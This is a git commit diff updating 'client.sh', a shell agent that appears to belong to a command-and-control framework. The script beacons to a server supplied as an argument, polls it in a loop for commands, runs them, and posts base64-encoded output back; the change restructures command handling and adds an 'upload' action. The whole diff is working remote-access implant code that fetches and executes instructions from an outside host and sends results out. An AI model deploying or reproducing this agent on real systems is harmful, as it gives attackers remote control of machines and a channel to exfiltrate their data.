7930e507e61e650e36e2535f18a6361e5b49e43b
Ug0Security <c.vallicari@gmail.com>
2022-10-13 00:22:48 +0200

    Update client.sh

--- scripts/agents/client.sh
+++ scripts/agents/client.sh
@@ -1,24 +1,28 @@
 #Hello
-curl -sk "$2/res.php?res=$(echo "Hello from Agent $1 (Linux)" | base64)&id=$1" > /dev/null
+curl -sk "$2/res.php?res=$(echo -n "Hello from Agent $1 (Linux)" | base64)&id=$1" > /dev/null
 while true
 do
 #grab 'n' run, skip if empty
-run=$(curl -sk $2/cmds.php?id=$1\&o=L | grep $1 | cut -f 2- -d ":")
+cmds=$(curl -sk $2/cmds.php?id=$1\&o=L)
+act=$(echo $cmds | grep $1 | cut -f 2 -d ":")
+
+if [[ $act == "run" ]];
+then
+run=$(echo $cmds | grep $1 | cut -f 3- -d ":")
+
 if [ -z "$run" ];
 then 
 sleep 10
 continue
 fi
-if [[ $3 == "debug" ]];
-then
-echo "Got a command : $run"
-fi
+
 res=$($run 2>&1| base64 | tr -d '\n')
-#send result and clean command once exec
-if [[ $3 == "debug" ]];
-then
-echo "Sending result : $res"
-fi
+#send result
 curl -sk -X POST $2/res.php -d "res=$(echo $res)&id=$1" > /dev/null
 sleep 10
+
+elif [[ $act == "upload" ]];
+then
+curl -sk -X POST $2/res.php -d "res=$(echo -n "Uploading" | base64)&id=$1" > /dev/null
+fi
 done
